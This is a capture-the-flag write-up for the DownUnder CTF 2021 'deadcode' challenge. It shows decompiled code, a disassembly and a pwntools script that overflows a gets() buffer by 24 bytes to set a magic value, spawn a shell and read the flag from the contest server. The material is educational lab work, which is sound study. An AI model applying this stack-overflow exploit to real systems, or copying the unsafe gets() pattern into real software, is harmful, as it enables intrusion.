+++
title = "deadcode Writeup (DownUnder CTF 2021)"
date = "2021-09-28"
updated = "2024-07-12"
+++


# deadcode

> I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.
> 
> Author: xXl33t_h@x0rXx
> 

## Analysis
### checksec

```
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

### Decompile with radare2

```cpp
undefined8 main(void){
    char *s;
    uint32_t var_8h;
    
    _var_8h = 0;
    sym.buffer_init();
    sym.imp.puts(
                "\nI\'m developing this new application in C, I\'ve setup some code for the new features but it\'s not (a)live yet."
                );
    sym.imp.puts("\nWhat features would you like to see in my app?");
    sym.imp.gets(&s);
    if (_var_8h == 0xdeadc0de) {
        sym.imp.puts("\n\nMaybe this code isn\'t so dead...");
        sym.imp.system("/bin/sh");
    }
    return 0;
}
```

The binary compares the variable `_var_8h` with `deadc0de` and if true, runs a shell.

So it looks like we have to overwrite the `_var_8h` variable.

Opening the binary in gdb and disassembling the main function, we can see the position of the `_var_8h` variable to be `rbp-0x8` at address `0x40119d`.

```
Dump of assembler code for function main:
   0x0000000000401195 <+0>:	push   rbp
   0x0000000000401196 <+1>:	mov    rbp,rsp
   0x0000000000401199 <+4>:	sub    rsp,0x20
   0x000000000040119d <+8>:	mov    QWORD PTR [rbp-0x8],0x0
   0x00000000004011a5 <+16>:	mov    eax,0x0
   0x00000000004011aa <+21>:	call   0x401152 <buffer_init>
   0x00000000004011af <+26>:	lea    rdi,[rip+0xe52]        # 0x402008
   0x00000000004011b6 <+33>:	call   0x401030 <puts@plt>
   0x00000000004011bb <+38>:	lea    rdi,[rip+0xeb6]        # 0x402078
   0x00000000004011c2 <+45>:	call   0x401030 <puts@plt>
   0x00000000004011c7 <+50>:	lea    rax,[rbp-0x20]
   0x00000000004011cb <+54>:	mov    rdi,rax
   0x00000000004011ce <+57>:	mov    eax,0x0
   0x00000000004011d3 <+62>:	call   0x401060 <gets@plt>
   0x00000000004011d8 <+67>:	mov    eax,0xdeadc0de
   0x00000000004011dd <+72>:	cmp    QWORD PTR [rbp-0x8],rax
   0x00000000004011e1 <+76>:	jne    0x401200 <main+107>
   0x00000000004011e3 <+78>:	lea    rdi,[rip+0xebe]        # 0x4020a8
   0x00000000004011ea <+85>:	call   0x401030 <puts@plt>
   0x00000000004011ef <+90>:	lea    rdi,[rip+0xed5]        # 0x4020cb
   0x00000000004011f6 <+97>:	mov    eax,0x0
   0x00000000004011fb <+102>:	call   0x401050 <system@plt>
   0x0000000000401200 <+107>:	mov    eax,0x0
   0x0000000000401205 <+112>:	leave  
   0x0000000000401206 <+113>:	ret    
End of assembler dump.
```

Now we need to find the offset from the input to the variable.

```
gef > pattern search Srbp-0x8
[+] Searching for 'Srbp-0x8"
[+] Found at offset 24 (little-endian search) likely
gef>
```

The offset for `_var_8h` is 24.

### Exploit

```py
from pwn import *

if args.REMOTE:
    p=remote('pwn-2021.duc.tf', 31916)
else:
    p=process('./deadcode')

payload='A'*24+p64(0xdeadc0de)
p.recvuntil("my app?")
p.sendline(payload)
p.sendline("cat flag.txt")
p.interactive()
```

```
$ python deadcode exploit.py REMOTE
[+] Opening connection to pwn-2021.duc.tf on port 31916: Done
[*] Switching to interactive mode



Maybe this code isn't so dead...
DUCTly0u_br0ught_m5_b4ck_t0_11f3_mn423kcv}$
[*] Interrupted
[*] Closed connection to pwn-2021.duc.tf port 31916
```

#### flag >> `DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}`
